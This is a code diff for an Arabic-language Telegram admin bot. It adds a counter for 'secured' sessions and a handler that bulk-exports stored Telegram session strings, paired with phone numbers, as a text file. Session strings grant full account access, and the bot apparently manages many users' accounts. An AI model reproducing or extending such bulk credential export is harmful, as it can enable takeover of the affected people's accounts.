@@ -232,11 +232,13 @@ async def _export_session_message(callback: CallbackQuery, session):
 async def _admin_panel_text(uid: int) -> str:
     count = await database.get_sessions_count(uid, SUPER_ADMIN_IDS)
     invalid = await database.count_invalid_sessions(uid, SUPER_ADMIN_IDS)
+    secured = await database.get_secured_sessions_count(uid, SUPER_ADMIN_IDS)
     lines = [
         "👋 أهلاً بالقيادة!",
         f"🤖 معرف البوت: <code>{BOT_ID}</code>",
         "",
         f"✅ نشطة: <b>{count}</b>",
+        f"🔒 مؤمّنة: <b>{secured}</b>",
     ]
     if invalid:
         lines.append(f"❌ غير صالحة (قابلة للحذف): <b>{invalid}</b>")
@@ -1208,6 +1210,51 @@ async def export_star_sessions_txt(callback: CallbackQuery):
     await callback.message.edit_text(
         text,
         reply_markup=sessions_keyboard(all_s, is_super_admin=True),
+        parse_mode="HTML",
+    )
+
+
+@dp.callback_query(F.data == "export_secured_txt")
+async def export_secured_sessions_txt(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+
+    uid = callback.from_user.id
+    all_sessions = await _sessions_for_admin(uid)
+    sessions = [s for s in all_sessions if database.row_flag(s, "secured")]
+    
+    if not sessions:
+        await callback.answer("❌ لا توجد جلسات مؤمّنة.", show_alert=True)
+        return
+
+    await callback.message.edit_text("⏳ جاري تجهيز ملف الجلسات المؤمّنة...", parse_mode="HTML")
+    lines = []
+    for s in sessions:
+        ss = s["session_string"]
+        if not ss or not str(ss).strip():
+            ss = await session_manager.ensure_session_string(s["phone"])
+        if ss:
+            lines.append(f"{s['phone']}:{ss}")
+    
+    if not lines:
+        await callback.message.edit_text("❌ لا توجد أكواد جلسات مؤمّنة لإرسالها.")
+        return
+
+    document = BufferedInputFile(
+        "\n".join(lines).encode("utf-8"),
+        filename="secured_sessions.txt",
+    )
+    await callback.message.answer_document(
+        document=document,
+        caption="🔒 <b>ملف الجلسات المؤمّنة (رقم:كود)</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+    )
+    
+    text = await _admin_panel_text(uid)
+    await callback.message.edit_text(
+        text,
+        reply_markup=sessions_keyboard(all_sessions, is_super_admin=is_super_admin(uid)),
         parse_mode="HTML",
     )
 
